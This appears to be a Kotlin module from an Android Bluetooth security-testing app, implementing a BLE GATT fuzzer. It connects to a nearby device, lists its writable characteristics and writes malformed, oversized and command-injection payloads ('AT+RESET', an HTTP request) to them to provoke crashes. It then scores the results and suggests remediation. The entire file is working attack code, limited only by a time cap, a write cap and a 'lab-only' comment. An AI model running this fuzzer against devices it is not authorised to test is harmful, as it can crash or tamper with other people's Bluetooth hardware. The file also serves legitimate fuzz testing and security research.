package com.bluetoothseclab.attacks

import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothGatt
import android.bluetooth.BluetoothGattCallback
import android.bluetooth.BluetoothGattCharacteristic
import android.bluetooth.BluetoothGattDescriptor
import android.bluetooth.BluetoothGattService
import android.bluetooth.BluetoothManager
import android.bluetooth.BluetoothProfile
import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log
import com.bluetoothseclab.models.AttackResult
import java.util.UUID
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger

/**
 * BLE GATT Service Fuzzer.
 *
 * Real attack: connects to a BLE device, enumerates all GATT services/characteristics,
 * then attempts malformed writes, oversized payloads, and invalid operations on each.
 * Based on BSFuzzer methodology (USENIX 2025) — tests for crash-causing inputs.
 *
 * No root required — uses standard Android BLE GATT API.
 *
 * Lab-only use. Auto-stops after MAX_DURATION_MS.
 */
object BleGattFuzzer {

    private const val TAG = "BleGattFuzzer"
    private const val MAX_DURATION_MS = 30_000L
    private const val GATT_TIMEOUT_MS = 8000L
    private const val WRITE_DELAY_MS = 200L
    private const val MAX_WRITE_ATTEMPTS = 50

    private val isRunning = AtomicBoolean(false)
    private val handler = Handler(Looper.getMainLooper())

    data class FuzzResult(
        val servicesDiscovered: Int,
        val characteristicsFound: Int,
        val writeAttempts: Int,
        val writeSuccesses: Int,
        val writeErrors: Int,
        val disconnects: Int,
        val crashDetected: Boolean
    )

    fun stop() {
        isRunning.set(false)
    }

    fun fuzz(
        device: BluetoothDevice,
        context: Context,
        onProgress: (String) -> Unit,
        onResult: (FuzzResult) -> Unit,
        onComplete: (AttackResult) -> Unit
    ) {
        if (isRunning.getAndSet(true)) {
            handler.post { onComplete(
                AttackResult(
                    moduleName = "BLE GATT Fuzzer",
                    status = AttackResult.Status.FAILED,
                    findings = listOf(AttackResult.Finding(
                        title = "Already Running",
                        description = "A GATT fuzz test is already in progress",
                        severity = AttackResult.Severity.INFO
                    )),
                    summary = "Skipped — already running",
                    riskScore = 0f,
                    durationMs = 0
                )
            )}
            return
        }

        val startTime = System.currentTimeMillis()
        val bluetoothManager = context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager
        if (bluetoothManager == null) {
            isRunning.set(false)
            handler.post { onComplete(
                AttackResult(
                    moduleName = "BLE GATT Fuzzer",
                    status = AttackResult.Status.FAILED,
                    findings = listOf(AttackResult.Finding(
                        title = "No Bluetooth",
                        description = "BluetoothManager not available",
                        severity = AttackResult.Severity.INFO
                    )),
                    summary = "Failed: no Bluetooth manager",
                    riskScore = 0f,
                    durationMs = 0
                )
            )}
            return
        }

        Thread {
            var gatt: BluetoothGatt? = null
            var servicesDiscovered = 0
            var characteristicsFound = 0
            var writeAttempts = 0
            var writeSuccesses = 0
            var writeErrors = 0
            var disconnects = 0
            var crashDetected = false

            handler.postDelayed({ isRunning.set(false) }, MAX_DURATION_MS)

            try {
                handler.post { onProgress("[FUZZ] Connecting to ${device.address}...") }

                val connectLatch = CountDownLatch(1)
                val connected = AtomicBoolean(false)

                val gattCallback = object : BluetoothGattCallback() {
                    override fun onConnectionStateChange(gatt: BluetoothGatt, status: Int, newState: Int) {
                        if (newState == BluetoothProfile.STATE_CONNECTED) {
                            connected.set(true)
                            handler.post { onProgress("[FUZZ] Connected. Discovering services...") }
                            gatt.discoverServices()
                        } else if (newState == BluetoothProfile.STATE_DISCONNECTED) {
                            if (connected.get()) {
                                disconnects++
                                handler.post { onProgress("[FUZZ] Disconnected (status=$status)") }
                            }
                            connectLatch.countDown()
                        }
                    }

                    override fun onServicesDiscovered(gatt: BluetoothGatt, status: Int) {
                        if (status == BluetoothGatt.GATT_SUCCESS) {
                            val services = gatt.services
                            servicesDiscovered = services.size
                            characteristicsFound = services.sumOf { it.characteristics.size }
                            handler.post { onProgress("[FUZZ] Found $servicesDiscovered services, $characteristicsFound characteristics") }
                            connectLatch.countDown()
                        } else {
                            handler.post { onProgress("[FUZZ] Service discovery failed (status=$status)") }
                            connectLatch.countDown()
                        }
                    }

                    override fun onCharacteristicWrite(
                        gatt: BluetoothGatt,
                        characteristic: BluetoothGattCharacteristic,
                        status: Int
                    ) {
                        if (status == BluetoothGatt.GATT_SUCCESS) {
                            writeSuccesses++
                        } else {
                            writeErrors++
                        }
                    }

                    override fun onCharacteristicRead(
                        gatt: BluetoothGatt,
                        characteristic: BluetoothGattCharacteristic,
                        status: Int
                    ) {
                        // Read responses tracked
                    }
                }

                gatt = device.connectGatt(context, false, gattCallback)
                if (gatt == null) {
                    isRunning.set(false)
                    handler.post { onComplete(
                        AttackResult(
                            moduleName = "BLE GATT Fuzzer",
                            status = AttackResult.Status.FAILED,
                            findings = listOf(AttackResult.Finding(
                                title = "Connection Failed",
                                description = "Could not establish GATT connection",
                                severity = AttackResult.Severity.INFO
                            )),
                            summary = "Failed: GATT connection refused",
                            riskScore = 0f,
                            durationMs = System.currentTimeMillis() - startTime
                        )
                    )}
                    return@Thread
                }

                connectLatch.await(GATT_TIMEOUT_MS, TimeUnit.MILLISECONDS)

                if (!connected.get()) {
                    isRunning.set(false)
                    handler.post { onComplete(
                        AttackResult(
                            moduleName = "BLE GATT Fuzzer",
                            status = AttackResult.Status.PARTIAL,
                            findings = listOf(AttackResult.Finding(
                                title = "Connection Timeout",
                                description = "Could not connect to device GATT",
                                severity = AttackResult.Severity.MEDIUM
                            )),
                            summary = "GATT connection failed or timed out",
                            riskScore = 1.0f,
                            durationMs = System.currentTimeMillis() - startTime
                        )
                    )}
                    return@Thread
                }

                // Phase 2: Fuzz all writable characteristics
                handler.post { onProgress("[FUZZ] Starting GATT fuzzing on $characteristicsFound characteristics...") }

                val writableChars = mutableListOf<Pair<BluetoothGattService, BluetoothGattCharacteristic>>()
                for (service in gatt.services) {
                    for (char in service.characteristics) {
                        val props = char.properties
                        if (props and BluetoothGattCharacteristic.PROPERTY_WRITE != 0 ||
                            props and BluetoothGattCharacteristic.PROPERTY_WRITE_NO_RESPONSE != 0) {
                            writableChars.add(service to char)
                        }
                    }
                }

                handler.post { onProgress("[FUZZ] ${writableChars.size} writable characteristics found") }

                // Fuzz payloads
                val fuzzPayloads = listOf(
                    byteArrayOf(),                                      // Empty
                    byteArrayOf(0xFF.toByte()),                          // Single byte max
                    byteArrayOf(0xFF.toByte(), 0xFF.toByte()),          // 2 bytes
                    byteArrayOf(0x41, 0x42, 0x43, 0x44, 0x45),        // Short ASCII
                    ByteArray(20) { (0x41 + (it % 26)).toByte() },    // 20 bytes (BLE MTU)
                    ByteArray(50) { (it % 256).toByte() },             // 50 bytes (oversized)
                    ByteArray(100) { 0x00 },                           // 100 bytes
                    ByteArray(255) { 0xFF.toByte() },                  // 255 bytes (max ATT)
                    ByteArray(512) { (it % 256).toByte() },            // 512 bytes (oversized)
                    ByteArray(1024) { 0xAA.toByte() },                 // 1024 bytes
                    byteArrayOf(0x00, 0x00, 0x00, 0x00, 0x00),        // All zeros
                    byteArrayOf(0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte()), // All 0xFF
                    byteArrayOf(0x41, 0x42, 0x43, 0x00, 0x00),        // Null terminator mid-string
                    "AT+RESET\r\n".toByteArray(),                      // AT command injection
                    "GET / HTTP/1.1\r\n\r\n".toByteArray(),            // HTTP injection
                )

                for ((charIdx, charEntry) in writableChars.withIndex()) {
                    if (!isRunning.get()) break
                    if (writeAttempts >= MAX_WRITE_ATTEMPTS) break

                    val characteristic = charEntry.second
                    handler.post { onProgress("[FUZZ] Characteristic $charIdx: ${characteristic.uuid}") }

                    for ((payloadIdx, payload) in fuzzPayloads.withIndex()) {
                        if (!isRunning.get()) break
                        if (writeAttempts >= MAX_WRITE_ATTEMPTS) break

                        writeAttempts++
                        try {
                            characteristic.value = payload
                            characteristic.writeType = if (characteristic.properties and BluetoothGattCharacteristic.PROPERTY_WRITE_NO_RESPONSE != 0) {
                                BluetoothGattCharacteristic.WRITE_TYPE_NO_RESPONSE
                            } else {
                                BluetoothGattCharacteristic.WRITE_TYPE_DEFAULT
                            }
                            gatt.writeCharacteristic(characteristic)
                            Thread.sleep(WRITE_DELAY_MS)
                        } catch (e: SecurityException) {
                            writeErrors++
                            handler.post { onProgress("[FUZZ] Permission denied on char $charIdx") }
                            break
                        } catch (e: Exception) {
                            writeErrors++
                            // Check for crash/disconnect
                            if (disconnects > 0) {
                                crashDetected = true
                                handler.post { onProgress("[FUZZ] Crash detected after payload $payloadIdx!") }
                                break
                            }
                        }
                    }

                    // Check if we got disconnected (crash indicator)
                    if (disconnects > 0 && !crashDetected) {
                        crashDetected = true
                        handler.post { onProgress("[FUZZ] Unexpected disconnect — possible crash") }
                    }

                    handler.post {
                        onProgress("[FUZZ] Char $charIdx done: $writeAttempts writes, $writeErrors errors")
                    }
                }

                val result = FuzzResult(
                    servicesDiscovered = servicesDiscovered,
                    characteristicsFound = characteristicsFound,
                    writeAttempts = writeAttempts,
                    writeSuccesses = writeSuccesses,
                    writeErrors = writeErrors,
                    disconnects = disconnects,
                    crashDetected = crashDetected
                )

                handler.post { onResult(result) }

                val findings = mutableListOf<AttackResult.Finding>()

                if (crashDetected) {
                    findings.add(AttackResult.Finding(
                        title = "GATT Crash/Disconnect Detected",
                        description = "Device disconnected unexpectedly after receiving malformed GATT write. " +
                            "This indicates the BLE stack may be vulnerable to crash-causing inputs. " +
                            "Similar to BSFuzzer findings (USENIX 2025).",
                        severity = AttackResult.Severity.CRITICAL,
                        cveReference = "BSFuzzer (USENIX 2025)",
                        remediation = "Update BLE stack, validate input lengths, implement bounds checking"
                    ))
                }

                findings.add(AttackResult.Finding(
                    title = "GATT Fuzzing Results",
                    description = "Services: $servicesDiscovered, " +
                        "Characteristics: $characteristicsFound, " +
                        "Writable: ${writableChars.size}, " +
                        "Writes: $writeAttempts (ok: $writeSuccesses, err: $writeErrors), " +
                        "Disconnects: $disconnects",
                    severity = if (crashDetected) AttackResult.Severity.CRITICAL
                        else if (writeErrors > 10) AttackResult.Severity.HIGH
                        else AttackResult.Severity.MEDIUM
                ))

                if (writeSuccesses > 0) {
                    findings.add(AttackResult.Finding(
                        title = "Writable Characteristics Without Authentication",
                        description = "Successfully wrote to $writeSuccesses characteristics without authentication. " +
                            "These characteristics may accept arbitrary data from any paired device.",
                        severity = AttackResult.Severity.HIGH,
                        remediation = "Require encryption/authentication for write access"
                    ))
                }

                val elapsed = System.currentTimeMillis() - startTime
                handler.post {
                    onComplete(
                        AttackResult(
                            moduleName = "BLE GATT Fuzzer",
                            status = if (crashDetected) AttackResult.Status.SUCCESS else AttackResult.Status.PARTIAL,
                            findings = findings,
                            summary = "GATT fuzz: $writeAttempts writes on ${writableChars.size} chars" +
                                if (crashDetected) " — CRASH DETECTED" else "",
                            riskScore = if (crashDetected) 9.5f else if (writeErrors > 5) 5.0f else 3.0f,
                            durationMs = elapsed
                        )
                    )
                }

            } catch (e: Exception) {
                val elapsed = System.currentTimeMillis() - startTime
                handler.post {
                    onComplete(
                        AttackResult(
                            moduleName = "BLE GATT Fuzzer",
                            status = AttackResult.Status.FAILED,
                            findings = listOf(AttackResult.Finding(
                                title = "Fuzzer Error",
                                description = e.message ?: "Unknown error",
                                severity = AttackResult.Severity.INFO
                            )),
                            summary = "GATT fuzz failed: ${e.message}",
                            riskScore = 0f,
                            durationMs = elapsed
                        )
                    )
                }
            } finally {
                try {
                    gatt?.disconnect()
                    gatt?.close()
                } catch (_: Exception) {}
                isRunning.set(false)
            }
        }.start()
    }
}
